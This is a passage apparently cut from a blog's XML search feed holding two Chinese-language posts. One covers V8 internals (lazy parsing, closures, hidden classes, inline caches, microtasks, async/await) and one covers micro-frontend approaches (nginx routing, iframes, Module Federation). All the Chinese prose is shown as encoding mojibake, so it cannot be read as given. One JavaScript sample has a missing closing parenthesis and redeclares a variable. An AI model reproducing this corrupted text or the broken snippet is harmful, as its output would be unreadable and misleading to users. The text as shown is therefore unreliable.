ç”¨å†…å­˜ï¼Œç‰¹åˆ«æ˜¯åœ¨æ‰‹æœºæ™®åŠçš„å¹´ä»£ï¼Œå†…å­˜æ˜¯éå¸¸å®è´µçš„èµ„æºã€‚</p></li></ul><p>åŸºäºä»¥ä¸Šçš„åŸå› ï¼Œæ‰€æœ‰ä¸»æµçš„ JavaScript è™šæ‹Ÿæœºéƒ½å®ç°äº†<strong>æƒ°æ€§è§£æ</strong>ã€‚æ‰€è°“æƒ°æ€§è§£ææ˜¯æŒ‡è§£æå™¨åœ¨è§£æçš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœé‡åˆ°å‡½æ•°å£°æ˜ï¼Œé‚£ä¹ˆä¼šè·³è¿‡å‡½æ•°å†…éƒ¨çš„ä»£ç ï¼Œå¹¶ä¸ä¼šä¸ºå…¶ç”Ÿæˆ AST å’Œå­—èŠ‚ç ï¼Œè€Œä»…ä»…ç”Ÿæˆé¡¶å±‚ä»£ç çš„ AST å’Œå­—èŠ‚ç ã€‚</p><h3 id="9-é—­åŒ…"><a href="#9-é—­åŒ…" class="headerlink" title="9. é—­åŒ…"></a>9. é—­åŒ…</h3><p>è™½ç„¶<code>foo</code>å‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡è¢«é”€æ¯äº†ï¼Œä½†æ˜¯ä¾ç„¶å­˜æ´»çš„<code>inner</code>å‡½æ•°å¼•ç”¨äº†<code>foo</code>å‡½æ•°ä½œç”¨åŸŸä¸­çš„å˜é‡<code>d</code>ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> d = <span class="number">200</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">inner</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b + d</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> f = foo()</span><br></pre></td></tr></table></figure></p><p><strong>è¿™ä¸ªæ—¶å€™å¸¦æ¥äº†ä¸¤ä¸ªé—®é¢˜ï¼š</strong></p><ul><li><code>foo</code>æ‰§è¡Œç»“æŸæ—¶ï¼Œå˜é‡<code>d</code>è¯¥ä¸è¯¥è¢«é”€æ¯ï¼Ÿ</li><li>å¦‚æœé‡‡ç”¨æƒ°æ€§è§£æï¼Œæ‰§è¡Œåˆ°<code>foo</code>å‡½æ•°æ—¶ï¼ŒV8åªä¼šè§£æ<code>foo</code>å‡½æ•°ï¼Œä¸ä¼šè§£æå†…éƒ¨çš„<code>inner</code>å‡½æ•°ï¼Œé‚£ä¹ˆV8å°±ä¸çŸ¥é“<code>inner</code>ä¸­å¼•ç”¨äº†å˜é‡<code>d</code></li></ul><p><strong>é‚£åº”è¯¥æ€æ ·å¤„ç†ï¼Ÿ</strong><br>æ­£ç¡®çš„å¤„ç†æ–¹å¼åº”è¯¥æ˜¯<code>foo</code>å‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡è¢«é”€æ¯ï¼Œä½†æ˜¯<code>inner</code>å‡½æ•°å¼•ç”¨çš„<code>foo</code>å‡½æ•°ä¸­çš„å˜é‡ä¸èƒ½è¢«é”€æ¯ã€‚æ­¤æ—¶V8å°±è¦å¯¹æ­¤åšç‰¹æ®Šå¤„ç†ï¼Œè´Ÿè´£å¤„ç†è¿™ä¸ªä»»åŠ¡çš„æ¨¡å—å«åš<strong>é¢„è§£æå™¨</strong></p><p>V8 å¼•å…¥é¢„è§£æå™¨ï¼Œæ¯”å¦‚å½“è§£æé¡¶å±‚ä»£ç çš„æ—¶å€™ï¼Œé‡åˆ°äº†ä¸€ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆé¢„è§£æå™¨å¹¶ä¸ä¼šç›´æ¥è·³è¿‡è¯¥å‡½æ•°ï¼Œè€Œæ˜¯å¯¹è¯¥å‡½æ•°åšä¸€æ¬¡å¿«é€Ÿçš„é¢„è§£æï¼Œå…¶ä¸»è¦ç›®çš„æœ‰ä¸¤ä¸ª</p><ul><li>åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¯­æ³•é”™è¯¯</li><li>æ£€æŸ¥å‡½æ•°å†…éƒ¨æ˜¯å¦å¼•ç”¨äº†å¤–éƒ¨å˜é‡ï¼Œå¦‚æœæ˜¯åˆ™å°†æ ˆä¸­çš„å˜é‡èµ‹å€¼åˆ°å †ä¸­ã€‚ä¸‹æ¬¡æ‰§è¡Œè¯¥å‡½æ•°æ—¶ï¼Œç›´æ¥ä½¿ç”¨å †ä¸­çš„å¼•ç”¨ï¼Œè§£å†³äº†é—­åŒ…å¸¦æ¥çš„é—®é¢˜ã€‚</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Q: å˜é‡aä¼šè¢«åˆ†é…åˆ°æ ˆä¸Šï¼Ÿè¿˜æ˜¯å †ä¸Šï¼Ÿ</span></span><br><span class="line">  <span class="comment">// A: å †ä¸Šã€‚é¢„è§£æå™¨é˜¶æ®µåœ¨å †ä¸­å¤åˆ¶äº†ä¸€ä¸ªä¸€æ ·çš„aï¼Œè°ƒç”¨fooå‡½æ•°ä½¿fooå‡ºæ ˆæ ˆä¸­çš„aè¢«é”€æ¯ï¼Œåªå‰©ä¸‹å †ä¸­çš„a</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">0</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">inner</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a++</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> t1 = foo()</span><br><span class="line"><span class="keyword">const</span> t2 = foo()</span><br><span class="line">t1() <span class="comment">// 0 </span></span><br><span class="line">t1() <span class="comment">// 1</span></span><br><span class="line">t2() <span class="comment">// 0</span></span><br></pre></td></tr></table></figure><h3 id="10-ä»£ç ç¼“å­˜"><a href="#10-ä»£ç ç¼“å­˜" class="headerlink" title="10. ä»£ç ç¼“å­˜"></a>10. ä»£ç ç¼“å­˜</h3><h3 id="11-éšè—ç±»ï¼šå¦‚ä½•åœ¨å†…å­˜ä¸­å¿«é€ŸæŸ¥æ‰¾å¯¹è±¡å±æ€§ï¼Ÿ"><a href="#11-éšè—ç±»ï¼šå¦‚ä½•åœ¨å†…å­˜ä¸­å¿«é€ŸæŸ¥æ‰¾å¯¹è±¡å±æ€§ï¼Ÿ" class="headerlink" title="11. éšè—ç±»ï¼šå¦‚ä½•åœ¨å†…å­˜ä¸­å¿«é€ŸæŸ¥æ‰¾å¯¹è±¡å±æ€§ï¼Ÿ"></a>11. éšè—ç±»ï¼šå¦‚ä½•åœ¨å†…å­˜ä¸­å¿«é€ŸæŸ¥æ‰¾å¯¹è±¡å±æ€§ï¼Ÿ</h3><p>JavaScript åœ¨è¿è¡Œæ—¶ï¼Œå¯¹è±¡çš„å±æ€§æ˜¯å¯ä»¥è¢«ä¿®æ”¹çš„ï¼Œæ‰€ä»¥å½“ V8 ä½¿ç”¨äº†ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œæ¯”å¦‚ä½¿ç”¨äº† start.x çš„æ—¶å€™ï¼Œå®ƒå¹¶ä¸çŸ¥é“è¯¥å¯¹è±¡ä¸­æ˜¯å¦æœ‰ xï¼Œä¹Ÿä¸çŸ¥é“ x ç›¸å¯¹äºå¯¹è±¡çš„åç§»é‡æ˜¯å¤šå°‘ï¼Œä¹Ÿå¯ä»¥è¯´ V8 å¹¶ä¸çŸ¥é“è¯¥å¯¹è±¡çš„å…·ä½“çš„å½¢çŠ¶ã€‚</p><p>è€Œé™æ€è¯­è¨€ä¸­ï¼Œåœ¨å£°æ˜ä¸€ä¸ªå¯¹è±¡å‰éœ€è¦å…ˆå®šä¹‰è¯¥å¯¹è±¡çš„ç»“æ„ã€‚ä»£ç æ‰§è¡Œå‰éœ€è¦å…ˆè¢«ç¼–è¯‘ï¼Œç¼–è¯‘æ—¶ï¼Œæ¯ä¸ªå¯¹è±¡çš„å½¢çŠ¶éƒ½æ˜¯å›ºå®šçš„ã€‚å› æ­¤å¯ä»¥ç›´æ¥é€šè¿‡åç§»é‡æŸ¥è¯¢å¯¹è±¡çš„å±æ€§å€¼ï¼Œ</p><p>è¿™ä¹Ÿå°±æ˜¯é™æ€è¯­è¨€çš„æ‰§è¡Œæ•ˆç‡æ›´é«˜çš„åŸå› ã€‚</p><p><strong>æ€æ ·å°†è¿™ç§é™æ€çš„ç‰¹æ€§å¼•å…¥V8ä¸­ï¼Ÿ</strong><br>ç­”æ¡ˆæ˜¯å¯è¡Œçš„ã€‚V8 æ‰§è¡Œåˆ°è¿™æ®µä»£ç æ—¶ï¼Œä¼šå…ˆä¸º point å¯¹è±¡åˆ›å»ºä¸€ä¸ªéšè—ç±»ï¼Œåœ¨ V8 ä¸­ï¼ŒæŠŠéšè—ç±»åˆç§°ä¸º mapï¼Œæ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ª map å±æ€§ï¼Œå…¶å€¼æŒ‡å‘å†…å­˜ä¸­çš„éšè—ç±»ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> point = &#123;<span class="attr">x</span>:<span class="number">100</span>,<span class="attr">y</span>:<span class="number">200</span>&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * pointå¯¹è±¡çš„éšè—ç±»ï¼ŒæŸ¥æ‰¾point.xçš„æµç¨‹æ˜¯ï¼Œå…ˆæŸ¥æ‰¾å¯¹è±¡pointçš„éšè—ç±»</span></span><br><span class="line"><span class="comment"> * å†é€šè¿‡éšè—ç±»æŸ¥æ‰¾xå±æ€§åç§»é‡ï¼Œç„¶åæ ¹æ®åç§»é‡è·å–å±æ€§å€¼</span></span><br><span class="line"><span class="comment"> * attr  offset</span></span><br><span class="line"><span class="comment"> * x     4</span></span><br><span class="line"><span class="comment"> * y     8</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></p><h3 id="12-å†…è”ç¼“å­˜"><a href="#12-å†…è”ç¼“å­˜" class="headerlink" title="12. å†…è”ç¼“å­˜"></a>12. å†…è”ç¼“å­˜</h3><p>å¦‚æœä¸€ä¸ªå‡½æ•°ä¸­åˆ©ç”¨äº†å¯¹è±¡çš„å±æ€§ï¼Œå¹¶ä¸”è¿™ä¸ªå‡½æ•°ä¼šè¢«å¤šæ¬¡æ‰§è¡Œï¼Œé‚£ä¹ˆ V8 å°±ä¼šè€ƒè™‘ï¼Œæ€ä¹ˆå°†è¿™ä¸ªæŸ¥æ‰¾è¿‡ç¨‹å†åº¦ç®€åŒ–ï¼Œæœ€å¥½èƒ½å°†å±æ€§çš„æŸ¥æ‰¾è¿‡ç¨‹èƒ½ä¸€æ­¥åˆ°ä½ã€‚</p><p>å› æ­¤ï¼ŒV8 å¼•å…¥äº† ICï¼ŒIC ä¼šç›‘å¬æ¯ä¸ªå‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œå¹¶åœ¨ä¸€äº›å…³é”®çš„åœ°æ–¹åŸ‹ä¸‹ç›‘å¬ç‚¹ï¼Œè¿™äº›åŒ…æ‹¬äº†åŠ è½½å¯¹è±¡å±æ€§ (Load)ã€ç»™å¯¹è±¡å±æ€§èµ‹å€¼ (Store)ã€è¿˜æœ‰å‡½æ•°è°ƒç”¨ (Call)ï¼ŒV8 ä¼šå°†ç›‘å¬åˆ°çš„æ•°æ®å†™å…¥ä¸€ä¸ªç§°ä¸ºåé¦ˆå‘é‡ (FeedBack Vector) çš„ç»“æ„ä¸­ï¼ŒåŒæ—¶ V8 ä¼šä¸ºæ¯ä¸ªæ‰§è¡Œçš„å‡½æ•°ç»´æŠ¤ä¸€ä¸ªåé¦ˆå‘é‡ã€‚æœ‰äº†åé¦ˆå‘é‡ç¼“å­˜çš„ä¸´æ—¶æ•°æ®ï¼ŒV8 å°±å¯ä»¥ç¼©çŸ­å¯¹è±¡å±æ€§çš„æŸ¥æ‰¾è·¯å¾„ï¼Œä»è€Œæå‡æ‰§è¡Œæ•ˆç‡ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¿™ä¸¤æ®µä»£ç è°çš„æ‰§è¡Œæ•ˆç‡æ›´é«˜ï¼Ÿ</span></span><br><span class="line"><span class="keyword">let</span> data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">data.forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> <span class="built_in">console</span>.log(item.toString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> data = [<span class="string">'1'</span>, <span class="number">2</span>, <span class="string">'3'</span>, <span class="number">4</span>]</span><br><span class="line">data.forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> <span class="built_in">console</span>.log(item.toString())</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ç¬¬ä¸€ç§æ–¹å¼æ•ˆç‡æ›´é«˜ã€‚</span></span><br><span class="line"><span class="comment">ç¬¬ä¸€ç§æ–¹å¼ä¸­ï¼Œæ¯ä¸€ä¸ªitemç±»å‹ä¸€æ ·ï¼Œåç»­å‡ æ¬¡è°ƒç”¨toStringå¯ä»¥ç›´æ¥å‘½ä¸­ï¼Œæ˜¯å•æ€ã€‚</span></span><br><span class="line"><span class="comment">ç¬¬äºŒç§æ–¹å¼ä¸­ï¼Œç”±äºitemç±»å‹é—´é”™ä¸åŒï¼Œç»å¸¸å˜æ¢ï¼Œå°±è¦åŒæ—¶ç¼“å­˜å¤šä¸ªç±»å‹ï¼Œæ˜¯å¤šæ€ã€‚</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="13-V8å¦‚ä½•å®ç°å›è°ƒå‡½æ•°ï¼Ÿ"><a href="#13-V8å¦‚ä½•å®ç°å›è°ƒå‡½æ•°ï¼Ÿ" class="headerlink" title="13. V8å¦‚ä½•å®ç°å›è°ƒå‡½æ•°ï¼Ÿ"></a>13. V8å¦‚ä½•å®ç°å›è°ƒå‡½æ•°ï¼Ÿ</h3><p>å›è°ƒå‡½æ•°ï¼šåªæœ‰å½“æŸä¸ªå‡½æ•°è¢«ä½œä¸ºå‚æ•°ï¼Œä¼ é€’ç»™å¦å¤–ä¸€ä¸ªå‡½æ•°ï¼Œæˆ–è€…ä¼ é€’ç»™å®¿ä¸»ç¯å¢ƒï¼Œç„¶åè¯¥å‡½æ•°åœ¨å‡½æ•°å†…éƒ¨æˆ–è€…åœ¨å®¿ä¸»ç¯å¢ƒä¸­è¢«è°ƒç”¨ï¼Œæ‰ç§°ä¸º<strong>å›è°ƒå‡½æ•°</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æœ¬è´¨æ˜¯readFileSyncæ˜¯åœ¨ä¸»çº¿ç¨‹ä¸Šæ‰§è¡Œçš„ï¼ŒreadFileåœ¨è¯»å†™çº¿ç¨‹ä¸­æ‰§è¡Œçš„</span></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">var</span> data = fs.readFileSync(<span class="string">'test.js'</span>)</span><br><span class="line"></span><br><span class="line">fs.readFile(<span class="string">'test.txt'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">    data.toString()  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>æ¯ä¸ªå®ä»»åŠ¡åœ¨æ‰§è¡Œæ—¶ï¼ŒV8ä¼šé‡æ–°åˆ›å»ºæ ˆã€‚<br>å¾®ä»»åŠ¡çœ‹æˆæ˜¯ä¸€ä¸ªéœ€è¦å¼‚æ­¥æ‰§è¡Œçš„å‡½æ•°ï¼Œæ‰§è¡Œæ—¶æœºæ˜¯åœ¨ä¸»å‡½æ•°æ‰§è¡Œç»“æŸä¹‹åã€å½“å‰å®ä»»åŠ¡ç»“æŸä¹‹å‰ã€‚</p><ul><li><p>å¾®ä»»åŠ¡<br>V8 ä¼šä¸ºæ¯ä¸ªå®ä»»åŠ¡ç»´æŠ¤ä¸€ä¸ªå¾®ä»»åŠ¡é˜Ÿåˆ—ã€‚å½“ V8 æ‰§è¡Œä¸€æ®µ JavaScript æ—¶ï¼Œä¼šä¸ºè¿™æ®µä»£ç åˆ›å»ºä¸€ä¸ªç¯å¢ƒå¯¹è±¡ï¼Œå¾®ä»»åŠ¡é˜Ÿåˆ—å°±æ˜¯å­˜æ”¾åœ¨è¯¥ç¯å¢ƒå¯¹è±¡ä¸­çš„ã€‚å½“ä½ é€šè¿‡ Promise.resolve ç”Ÿæˆä¸€ä¸ªå¾®ä»»åŠ¡ï¼Œè¯¥å¾®ä»»åŠ¡ä¼šè¢« V8 è‡ªåŠ¨æ·»åŠ è¿›å¾®ä»»åŠ¡é˜Ÿåˆ—ï¼Œç­‰æ•´æ®µä»£ç å¿«è¦æ‰§è¡Œç»“æŸæ—¶ï¼Œè¯¥ç¯å¢ƒå¯¹è±¡ä¹Ÿéšä¹‹è¢«é”€æ¯ï¼Œä½†æ˜¯åœ¨é”€æ¯ä¹‹å‰ï¼ŒV8 ä¼šå…ˆå¤„ç†å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­çš„å¾®ä»»åŠ¡ã€‚</p></li><li><p>async/await<br>async æ˜¯ä¸€ä¸ªé€šè¿‡å¼‚æ­¥æ‰§è¡Œå¹¶éšå¼è¿”å› Promise ä½œä¸ºç»“æœçš„å‡½æ•°ã€‚</p></li></ul><p>é€šå¸¸ï¼Œawait å¯ä»¥ç­‰å¾…ä¸¤ç§ç±»å‹çš„è¡¨è¾¾å¼ï¼šå¯ä»¥æ˜¯ä»»ä½•æ™®é€šè¡¨è¾¾å¼ ;ä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ª Promise å¯¹è±¡çš„è¡¨è¾¾å¼ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æˆ‘ä»¬ä½¿ç”¨ await ç­‰å¾…ä¸€ä¸ªæ²¡æœ‰ resolve çš„ Promiseï¼Œé‚£ä¹ˆè¿™ä¹Ÿå°±æ„å‘³ç€ï¼ŒgetResult å‡½æ•°ä¼šä¸€ç›´ç­‰å¾…ä¸‹å»ã€‚</span></span><br><span class="line"><span class="comment">// æˆ‘ä»¬å¯ä»¥ç”¨resolveæ¥æ¢å¤è¯¥åç¨‹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">NeverResolvePromise</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getResult</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="keyword">await</span> NeverResolvePromise()</span><br><span class="line">  <span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;</span><br><span class="line">getResult()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p><h3 id="14-åƒåœ¾å›æ”¶"><a href="#14-åƒåœ¾å›æ”¶" class="headerlink" title="14.åƒåœ¾å›æ”¶"></a>14.åƒåœ¾å›æ”¶</h3><p>======</p><h3 id="é‡å­¦å‰ç«¯â€”â€”æµè§ˆå™¨å·¥ä½œåŸç†"><a href="#é‡å­¦å‰ç«¯â€”â€”æµè§ˆå™¨å·¥ä½œåŸç†" class="headerlink" title="é‡å­¦å‰ç«¯â€”â€”æµè§ˆå™¨å·¥ä½œåŸç†"></a>é‡å­¦å‰ç«¯â€”â€”æµè§ˆå™¨å·¥ä½œåŸç†</h3>]]></content>
      
      
    </entry>
    
    <entry>
      <title>å¾®å‰ç«¯(æ’ä»¶æœºåˆ¶)</title>
      <link href="/2021/06/21/%E5%BE%AE%E5%89%8D%E7%AB%AF/"/>
      <url>/2021/06/21/%E5%BE%AE%E5%89%8D%E7%AB%AF/</url>
      <content type="html"><![CDATA[<h3 id="1-å¾®å‰ç«¯æ˜¯ä»€ä¹ˆ"><a href="#1-å¾®å‰ç«¯æ˜¯ä»€ä¹ˆ" class="headerlink" title="1. å¾®å‰ç«¯æ˜¯ä»€ä¹ˆ"></a>1. å¾®å‰ç«¯æ˜¯ä»€ä¹ˆ</h3><p>å¾®å‰ç«¯æ˜¯ä¸€ç§æ¶æ„é£æ ¼ï¼Œå°†ç‹¬ç«‹äº¤ä»˜çš„å‰ç«¯åº”ç”¨ç¨‹åºç»„åˆæˆä¸€ä¸ªæ›´å¤§çš„æ•´ä½“ã€‚ä¿è¯äº§å“ä½“éªŒçš„åŒæ—¶æå‡å¼€å‘ä½“éªŒã€‚<br>ä¼˜åŠ¿</p><ul><li>ä¸é™æŠ€æœ¯æ ˆï¼šä¸»æ¡†æ¶ä¸é™åˆ¶æ¥å…¥åº”ç”¨çš„æŠ€æœ¯æ ˆï¼Œå­åº”ç”¨å¯è‡ªä¸»é€‰æ‹©æŠ€æœ¯æ ˆã€‚</li><li>å¯ç‹¬ç«‹å¼€å‘éƒ¨ç½²ï¼šå„ä¸ªå›¢é˜Ÿä¹‹é—´ä»“åº“ç‹¬ç«‹ï¼Œå•ç‹¬éƒ¨ç½²ï¼Œäº’ä¸ä¾èµ–ã€‚</li><li>ç‹¬ç«‹è¿è¡Œæ—¶ï¼šæ¯ä¸ªå­åº”ç”¨ä¹‹é—´çŠ¶æ€éš”ç¦»ï¼Œè¿è¡Œæ—¶çŠ¶æ€ä¸å…±äº«ã€‚</li><li>å¢é‡å‡çº§ï¼šå½“ä¸€ä¸ªåº”ç”¨åºå¤§ä¹‹åï¼ŒæŠ€æœ¯å‡çº§æˆ–é‡æ„ç›¸å½“éº»çƒ¦ï¼Œè€Œå¾®åº”ç”¨å…·å¤‡æ¸è¿›å¼å‡çº§çš„ç‰¹æ€§ã€‚</li></ul><p>ä½œè€…ï¼šå­—èŠ‚å‰ç«¯<br>é“¾æ¥ï¼š<a href="https://juejin.cn/post/7163481140165246983" target="_blank" rel="noopener">https://juejin.cn/post/7163481140165246983</a><br>æ¥æºï¼šç¨€åœŸæ˜é‡‘<br>è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p><p><br></p><h3 id="2-ä¸ºä»€ä¹ˆè¦ç”¨å¾®å‰ç«¯"><a href="#2-ä¸ºä»€ä¹ˆè¦ç”¨å¾®å‰ç«¯" class="headerlink" title="2. ä¸ºä»€ä¹ˆè¦ç”¨å¾®å‰ç«¯"></a>2. ä¸ºä»€ä¹ˆè¦ç”¨å¾®å‰ç«¯</h3><ul><li>æ‰“åŒ…é€Ÿåº¦ï¼šå·¥ç¨‹è¶Šæ¥è¶Šå¤§ï¼Œæ‰“åŒ…è¶Šæ¥è¶Šæ…¢</li><li>å¤šäººå¤šåœ°åä½œï¼šå¤šäººåœ¨åŒä¸€ä¸ªå·¥ç¨‹é‡Œå¼€å‘ï¼Œé­é‡ä»£ç å†²çªçš„æ¦‚ç‡ä¼šå¾ˆé¢‘ç¹ï¼Œè€Œä¸”å†²çªçš„å½±å“é¢æ¯”è¾ƒå¤§ã€‚</li><li>æµ‹è¯•éš¾åº¦ï¼šç”±äºä»£ç éƒ½åœ¨ä¸€ä¸ªä»“åº“é‡Œï¼Œæ¯æ¬¡å‘å¸ƒä¿®æ”¹éƒ½ä¼šå‚¬ç”Ÿå¤§é¢ç§¯çš„æµ‹è¯•å·¥ä½œ</li></ul><p><br></p><h3 id="3-å®ç°å¾®å‰ç«¯"><a href="#3-å®ç°å¾®å‰ç«¯" class="headerlink" title="3.å®ç°å¾®å‰ç«¯"></a>3.å®ç°å¾®å‰ç«¯</h3><h4 id="3-1-nginxè·¯ç”±åˆ†å‘"><a href="#3-1-nginxè·¯ç”±åˆ†å‘" class="headerlink" title="3.1 nginxè·¯ç”±åˆ†å‘"></a>3.1 nginxè·¯ç”±åˆ†å‘</h4><p>nginxåå‘ä»£ç†ï¼Œç®€å•å¿«é€Ÿ/å®Œå…¨éš”ç¦»ï¼Œä½†æ˜¯åº”ç”¨ä¹‹é—´åˆ‡æ¢ä¼šæœ‰ç™½å±ï¼ŒçŠ¶æ€å…±äº«å›°éš¾</p><p><br></p><h4 id="3-2-iframe"><a href="#3-2-iframe" class="headerlink" title="3.2 iframe"></a>3.2 iframe</h4><p>iframe ä½¿ä»ç‹¬ç«‹çš„å­é¡µé¢æ„å»ºé¡µé¢å˜å¾—å¾ˆå®¹æ˜“ã€‚å®ƒä»¬è¿˜åœ¨æ ·å¼å’Œå…¨å±€å˜é‡ä¸ç›¸äº’å¹²æ‰°æ–¹é¢æä¾›äº†è‰¯å¥½çš„éš”ç¦»ç¨‹åº¦ã€‚ä½†ä»–çš„æœ€å¤§é—®é¢˜ä¹Ÿåœ¨äºä»–çš„éš”ç¦»æ€§æ— æ³•è¢«çªç ´ï¼Œå¯¼è‡´åº”ç”¨é—´ä¸Šä¸‹æ–‡æ— æ³•è¢«å…±äº«ï¼Œéšä¹‹å¸¦æ¥çš„å¼€å‘ä½“éªŒã€äº§å“ä½“éªŒçš„é—®é¢˜ã€‚</p><p>ç¼ºç‚¹ï¼š</p><ul><li>URL ä¸åŒæ­¥ã€‚æµè§ˆå™¨åˆ·æ–° iframe url çŠ¶æ€ä¸¢å¤±ã€åé€€å‰è¿›æŒ‰é’®æ— æ³•ä½¿ç”¨ã€‚</li><li>UI ä¸åŒæ­¥ï¼ŒDOM ç»“æ„ä¸å…±äº«ã€‚å¦‚æ— æ³•æ˜¾ç¤ºæ•´é¡µå¼¹çª—ã€‚</li><li>å…¨å±€ä¸Šä¸‹æ–‡å®Œå…¨éš”ç¦»ï¼Œå†…å­˜å˜é‡ä¸å…±äº«ã€‚iframe å†…å¤–ç³»ç»Ÿçš„é€šä¿¡ã€æ•°æ®åŒæ­¥ç­‰éœ€æ±‚ï¼Œä¸»åº”ç”¨çš„ cookie è¦é€ä¼ åˆ°æ ¹åŸŸåéƒ½ä¸åŒçš„å­åº”ç”¨ä¸­å®ç°å…ç™»æ•ˆæœã€‚</li><li>åŠ è½½æ…¢ï¼Œæ¯æ¬¡å­åº”ç”¨è¿›å…¥éƒ½æ˜¯ä¸€æ¬¡æµè§ˆå™¨ä¸Šä¸‹æ–‡é‡å»ºã€èµ„æºé‡æ–°åŠ è½½çš„è¿‡ç¨‹ã€‚</li></ul><p><br></p><h4 id="3-3-Module-Federationæ’ä»¶æœºåˆ¶"><a href="#3-3-Module-Federationæ’ä»¶æœºåˆ¶" class="headerlink" title="3.3 Module Federationæ’ä»¶æœºåˆ¶"></a>3.3 Module Federationæ’ä»¶æœºåˆ¶</h4><p>Webpack5 Module Federationï¼ˆæ¨¡å—è”é‚¦ï¼‰ï¼ŒæŒ‰éœ€åŠ è½½æ¨¡å—ï¼Œæ”¯æŒåŠ¨æ€æ›´æ–°</p><p><br></p><h3 id="4-æ³¨æ„äº‹é¡¹"><a href="#4-æ³¨æ„äº‹é¡¹" class="headerlink" title="4. æ³¨æ„äº‹é¡¹"></a>4. æ³¨æ„äº‹é¡¹</h3><ul><li><p><em>ç”¨æˆ·ç™»å½•æœºåˆ¶</em><br>å°†ç”¨æˆ·çš„ç»Ÿä¸€ç™»å½•å’Œè®¤è¯é—®é¢˜äº¤ç»™äº†SSOï¼Œæ‰€æœ‰çš„é¡¹ç›®çš„åç«¯Serveréƒ½è¦æ¥å…¥SSOæ 